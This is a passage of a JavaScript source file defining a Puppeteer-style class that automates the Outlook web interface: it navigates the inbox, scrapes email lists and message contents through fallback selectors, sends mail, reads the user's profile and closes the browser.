                console.log('🏠 Using consumer Outlook URL');
            }
            
            // Navigate to appropriate inbox
            await this.page.goto(inboxUrl, {
                waitUntil: ['networkidle0', 'domcontentloaded'],
                timeout: 30000
            });

            // Wait for inbox to load with multiple possible selectors
            const inboxSelectors = [
                '[data-testid="message-list"]',
                '[role="main"]',
                '.message-list',
                '[aria-label*="message"]',
                '.email-list'
            ];
            
            let inboxLoaded = false;
            for (const selector of inboxSelectors) {
                try {
                    await this.page.waitForSelector(selector, { timeout: 5000 });
                    console.log(`✅ Inbox loaded with selector: ${selector}`);
                    inboxLoaded = true;
                    break;
                } catch (error) {
                    // Try next selector
                    continue;
                }
            }
            
            if (!inboxLoaded) {
                // Try to wait for any email-related elements
                await new Promise(resolve => setTimeout(resolve, 3000));
                console.log('⚠️ Inbox loaded but selectors not found, continuing anyway');
            }
            
            this.lastActivity = Date.now();
            return true;
        } catch (error) {
            console.error('❌ Failed to navigate to inbox:', error.message);
            return false;
        }
    }

    // Get emails from inbox
    async getEmails(count = 10) {
        if (!this.page) {
            throw new Error('Browser page not available');
        }

        try {
            console.log(`📧 Retrieving ${count} emails from inbox...`);
            
            // Ensure we're in the inbox
            await this.navigateToInbox();
            
            // Wait for emails to load with multiple possible selectors
            const emailListSelectors = [
                '[data-testid="message-item"]',
                '[role="listitem"]',
                '.message-item',
                '[aria-label*="message"]',
                '.email-item'
            ];
            
            let emailElements = null;
            for (const selector of emailListSelectors) {
                try {
                    await this.page.waitForSelector(selector, { timeout: 5000 });
                    console.log(`📧 Found emails with selector: ${selector}`);
                    break;
                } catch (error) {
                    continue;
                }
            }
            
            // Extract email data with fallback selectors
            const emails = await this.page.evaluate((emailCount) => {
                // Try multiple selectors for email list items
                const possibleSelectors = [
                    '[data-testid="message-item"]',
                    '[role="listitem"]', 
                    '.message-item',
                    '[aria-label*="message"]',
                    '.email-item',
                    '.ms-List-cell',
                    '[data-list-index]'
                ];
                
                let emailElements = null;
                for (const selector of possibleSelectors) {
                    emailElements = document.querySelectorAll(selector);
                    if (emailElements.length > 0) {
                        console.log(`Found ${emailElements.length} emails with selector: ${selector}`);
                        break;
                    }
                }
                
                if (!emailElements || emailElements.length === 0) {
                    console.warn('No email elements found with any selector');
                    return [];
                }
                
                const extractedEmails = [];
                
                for (let i = 0; i < Math.min(emailCount, emailElements.length); i++) {
                    const element = emailElements[i];
                    
                    try {
                        // Try multiple selector patterns for email data
                        const senderSelectors = ['[data-testid="message-sender"]', '.sender', '.from', '.ms-Persona-primaryText'];
                        const subjectSelectors = ['[data-testid="message-subject"]', '.subject', '.ms-TooltipHost'];
                        const dateSelectors = ['[data-testid="message-date"]', '.date', '.time', '.ms-FocusZone'];
                        const previewSelectors = ['[data-testid="message-preview"]', '.preview', '.body-preview'];
                        
                        let senderElement = null, subjectElement = null, dateElement = null, previewElement = null;
                        
                        // Find sender
                        for (const sel of senderSelectors) {
                            senderElement = element.querySelector(sel);
                            if (senderElement && senderElement.textContent.trim()) break;
                        }
                        
                        // Find subject
                        for (const sel of subjectSelectors) {
                            subjectElement = element.querySelector(sel);
                            if (subjectElement && subjectElement.textContent.trim()) break;
                        }
                        
                        // Find date
                        for (const sel of dateSelectors) {
                            dateElement = element.querySelector(sel);
                            if (dateElement && dateElement.textContent.trim()) break;
                        }
                        
                        // Find preview
                        for (const sel of previewSelectors) {
                            previewElement = element.querySelector(sel);
                            if (previewElement && previewElement.textContent.trim()) break;
                        }
                        
                        // Get a reliable ID for the email
                        let emailId = null;
                        const possibleIdAttributes = ['data-convid', 'data-id', 'id', 'data-list-index', 'data-item-id'];
                        
                        for (const attr of possibleIdAttributes) {
                            const value = element.getAttribute(attr);
                            if (value) {
                                emailId = value;
                                break;
                            }
                        }
                        
                        // If no ID found, create one based on position but store element reference
                        if (!emailId) {
                            emailId = `email_${i}`;
                            // Mark the element with our custom ID for later reference
                            element.setAttribute('data-custom-id', emailId);
                        }
                        
                        const email = {
                            id: emailId,
                            sender: senderElement ? senderElement.textContent.trim() : 'Unknown Sender',
                            subject: subjectElement ? subjectElement.textContent.trim() : 'No Subject',
                            receivedDateTime: dateElement ? dateElement.textContent.trim() : new Date().toISOString(),
                            bodyPreview: previewElement ? previewElement.textContent.trim() : '',
                            isRead: !element.classList.contains('unread'),
                            hasAttachments: element.querySelector('.attachment-icon') !== null || 
                                           element.querySelector('[data-icon-name="Attach"]') !== null,
                            // Store selector info for getEmailContent to use
                            _elementIndex: i,
                            _hasRealId: emailId !== `email_${i}`
                        };
                        
                        extractedEmails.push(email);
                    } catch (error) {
                        console.warn('Error extracting email data:', error);
                    }
                }
                
                return extractedEmails;
            }, count);
            
            console.log(`✅ Retrieved ${emails.length} emails`);
            this.lastActivity = Date.now();
            return emails;
        } catch (error) {
            console.error('❌ Failed to get emails:', error.message);
            throw error;
        }
    }

    // Get detailed email content
    async getEmailContent(emailId) {
        if (!this.page) {
            throw new Error('Browser page not available');
        }

        try {
            console.log(`📖 Getting content for email: ${emailId}`);
            
            // Try multiple approaches to find and click the email
            let emailClicked = false;
            
            // Approach 1: Try real ID selectors
            const idSelectors = [
                `[data-convid="${emailId}"]`,
                `[data-id="${emailId}"]`,
                `[id="${emailId}"]`,
                `[data-item-id="${emailId}"]`,
                `[data-list-index="${emailId}"]`
            ];
            
            for (const selector of idSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.click();
                        emailClicked = true;
                        console.log(`📧 Clicked email using selector: ${selector}`);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            // Approach 2: Try custom ID selector for synthetic IDs
            if (!emailClicked && emailId.startsWith('email_')) {
                try {
                    const customElement = await this.page.$(`[data-custom-id="${emailId}"]`);
                    if (customElement) {
                        await customElement.click();
                        emailClicked = true;
                        console.log(`📧 Clicked email using custom ID: ${emailId}`);
                    }
                } catch (error) {
                    // Try index-based approach
                    const index = parseInt(emailId.replace('email_', ''));
                    if (!isNaN(index)) {
                        try {
                            // Try multiple selectors for email list
                            const listSelectors = [
                                '[data-testid="message-item"]',
                                '[role="listitem"]', 
                                '.message-item',
                                '.ms-List-cell'
                            ];
                            
                            for (const listSelector of listSelectors) {
                                const elements = await this.page.$$(listSelector);
                                if (elements && elements[index]) {
                                    await elements[index].click();
                                    emailClicked = true;
                                    console.log(`📧 Clicked email using index ${index} with selector: ${listSelector}`);
                                    break;
                                }
                            }
                        } catch (indexError) {
                            console.warn(`Failed to click email by index: ${indexError.message}`);
                        }
                    }
                }
            }
            
            if (!emailClicked) {
                throw new Error(`Could not find or click email with ID: ${emailId}`);
            }
            
            // Wait for email content to load with multiple possible selectors
            const contentSelectors = [
                '[data-testid="message-body"]',
                '.message-body',
                '.email-body',
                '.ms-Panel-main',
                '.message-content',
                '[role="main"]'
            ];
            
            let contentElement = null;
            for (const selector of contentSelectors) {
                try {
                    await this.page.waitForSelector(selector, { timeout: 5000 });
                    contentElement = await this.page.$(selector);
                    if (contentElement) {
                        console.log(`📖 Found content with selector: ${selector}`);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            // Extract email content with fallback selectors
            const emailContent = await this.page.evaluate(() => {
                // Try multiple selectors for different Outlook layouts
                const bodySelectors = [
                    '[data-testid="message-body"]',
                    '.message-body',
                    '.email-body', 
                    '.ms-Panel-main .ms-Panel-content',
                    '.message-content',
                    '[role="main"] div',
                    '.mail-body'
                ];
                
                const senderSelectors = [
                    '[data-testid="message-sender-detail"]',
                    '.sender-detail',
                    '.from-detail',
                    '.ms-Persona-primaryText',
                    '.sender-info'
                ];
                
                const subjectSelectors = [
                    '[data-testid="message-subject-detail"]',
                    '.subject-detail',
                    '.message-subject',
                    '.email-subject',
                    '.mail-subject'
                ];
                
                const dateSelectors = [
                    '[data-testid="message-date-detail"]',
                    '.date-detail',
                    '.message-date',
                    '.received-date',
                    '.mail-date'
                ];
                
                let bodyElement = null, senderElement = null, subjectElement = null, dateElement = null;
                
                // Find body
                for (const sel of bodySelectors) {
                    bodyElement = document.querySelector(sel);
                    if (bodyElement) break;
                }
                
                // Find sender
                for (const sel of senderSelectors) {
                    senderElement = document.querySelector(sel);
                    if (senderElement && senderElement.textContent.trim()) break;
                }
                
                // Find subject
                for (const sel of subjectSelectors) {
                    subjectElement = document.querySelector(sel);
                    if (subjectElement && subjectElement.textContent.trim()) break;
                }
                
                // Find date
                for (const sel of dateSelectors) {
                    dateElement = document.querySelector(sel);
                    if (dateElement && dateElement.textContent.trim()) break;
                }
                
                return {
                    body: bodyElement ? bodyElement.innerHTML : '',
                    bodyText: bodyElement ? bodyElement.textContent : '',
                    sender: senderElement ? senderElement.textContent.trim() : '',
                    subject: subjectElement ? subjectElement.textContent.trim() : '',
                    receivedDateTime: dateElement ? dateElement.textContent.trim() : '',
                    hasAttachments: document.querySelector('.attachment-list') !== null ||
                                   document.querySelector('[data-icon-name="Attach"]') !== null ||
                                   document.querySelector('.attachment-icon') !== null
                };
            });
            
            console.log('✅ Email content retrieved');
            this.lastActivity = Date.now();
            return emailContent;
        } catch (error) {
            console.error('❌ Failed to get email content:', error.message);
            throw error;
        }
    }

    // Send an email
    async sendEmail(to, subject, body, isHtml = false) {
        if (!this.page) {
            throw new Error('Browser page not available');
        }

        try {
            console.log(`📤 Sending email to: ${to}`);
            
            // Navigate to compose
            await this.page.goto('https://outlook.live.com/mail/0/compose', {
                waitUntil: ['networkidle0', 'domcontentloaded'],
                timeout: 30000
            });
            
            // Wait for compose form
            await this.page.waitForSelector('[data-testid="to-field"]', { timeout: 10000 });
            
            // Fill in recipient
            await this.page.type('[data-testid="to-field"]', to);
            
            // Fill in subject
            const subjectField = await this.page.waitForSelector('[data-testid="subject-field"]');
            await subjectField.type(subject);
            
            // Fill in body
            if (isHtml) {
                // Switch to HTML mode if needed and insert HTML content
                await this.page.evaluate((htmlBody) => {
                    const bodyFrame = document.querySelector('[data-testid="compose-body-frame"]');
                    if (bodyFrame && bodyFrame.contentDocument) {
                        bodyFrame.contentDocument.body.innerHTML = htmlBody;
                    }
                }, body);
            } else {
                // Insert plain text
                const bodyField = await this.page.waitForSelector('[data-testid="compose-body"]');
                await bodyField.type(body);
            }
            
            // Send the email
            await this.page.click('[data-testid="send-button"]');
            
            // Wait for confirmation
            await this.page.waitForSelector('[data-testid="send-confirmation"]', { timeout: 10000 });
            
            console.log('✅ Email sent successfully');
            this.lastActivity = Date.now();
            return { success: true, message: 'Email sent successfully' };
        } catch (error) {
            console.error('❌ Failed to send email:', error.message);
            throw error;
        }
    }

    // Get user profile information
    async getUserProfile() {
        if (!this.page) {
            throw new Error('Browser page not available');
        }

        try {
            console.log('👤 Getting user profile...');
            
            // Navigate to profile/settings page
            await this.page.goto('https://outlook.live.com/mail/options/accounts', {
                waitUntil: ['networkidle0', 'domcontentloaded'],
                timeout: 30000
            });
            
            // Extract profile information
            const profile = await this.page.evaluate(() => {
                // Try to find user email and name from various locations
                const emailElements = document.querySelectorAll('[data-testid="user-email"], .user-email, .account-email');
                const nameElements = document.querySelectorAll('[data-testid="user-name"], .user-name, .account-name');
                
                let email = '';
                let name = '';
                
                for (const element of emailElements) {
                    if (element.textContent.includes('@')) {
                        email = element.textContent.trim();
                        break;
                    }
                }
                
                for (const element of nameElements) {
                    if (element.textContent && element.textContent.length > 0) {
                        name = element.textContent.trim();
                        break;
                    }
                }
                
                return {
                    mail: email,
                    userPrincipalName: email,
                    displayName: name || email.split('@')[0],
                    id: 'browser-automation-user'
                };
            });
            
            console.log('✅ User profile retrieved');
            this.lastActivity = Date.now();
            return profile;
        } catch (error) {
            console.error('❌ Failed to get user profile:', error.message);
            // Return a fallback profile
            return {
                mail: 'user@example.com',
                userPrincipalName: 'user@example.com',
                displayName: 'Outlook User',
                id: 'browser-automation-user'
            };
        }
    }

    async close() {
        if (this.isClosing) {
            return;
        }
        
        this.isClosing = true;
        console.log('🔒 Closing browser automation...');
        
        try {
            if (this.page) {
                await this.page.close();
                this.page = null;
            }
            
            if (this.context) {
                await this.context.close();
                this.context = null;
            }
            
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
            }
            
            console.log('✅ Browser automation closed successfully');
        } catch (error) {
            console.warn('⚠️ Error during cleanup:', error.message);
        } finally {
            this.isClosing = false;
        }
    }
}

module.exports = { ClosedBridgeAutomation };